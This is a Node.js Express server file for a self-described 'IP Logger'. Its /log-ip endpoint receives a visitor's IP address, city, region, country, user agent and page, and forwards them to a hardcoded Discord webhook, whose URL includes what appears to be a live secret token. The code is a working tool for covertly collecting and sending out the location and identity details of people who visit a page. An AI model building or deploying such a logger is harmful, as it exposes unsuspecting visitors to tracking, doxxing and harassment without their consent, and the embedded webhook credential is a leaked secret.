// server.js
const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
// Serve files from current directory
app.use(express.static(__dirname));

// Your Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';

// Endpoint to handle IP logging
app.post('/log-ip', async (req, res) => {
    try {
        const { ip, city, region, country, userAgent, timestamp, page } = req.body;
        
        // Log to console for debugging
        console.log(`IP Received: ${ip} from ${city}, ${country}`);
        
        // Create Discord embed message
        const embed = {
            title: "New IP Logged",
            color: 0x5865F2, // Discord blurple
            fields: [
                {
                    name: "IP Address",
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: "Location",
                    value: `${city}, ${region}, ${country}`,
                    inline: true
                },
                {
                    name: "Timestamp",
                    value: new Date(timestamp).toLocaleString(),
                    inline: true
                },
                {
                    name: "Page",
                    value: page || 'Unknown',
                    inline: false
                },
                {
                    name: "User Agent",
                    value: `\`\`\`${userAgent.substring(0, 1000)}\`\`\``,
                    inline: false
                }
            ],
            footer: {
                text: "IP Logger • " + new Date().toLocaleDateString()
            },
            timestamp: new Date().toISOString()
        };

        // Send to Discord webhook
        await axios.post(DISCORD_WEBHOOK_URL, {
            embeds: [embed],
            username: "ip logger"
        });

        res.json({ success: true, message: "Logged successfully" });
        
    } catch (error) {
        console.error('Error sending to Discord:', error.message);
        res.status(500).json({ success: false, error: "Failed to log IP" });
    }
});

// Serve the HTML file when someone visits the root URL
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
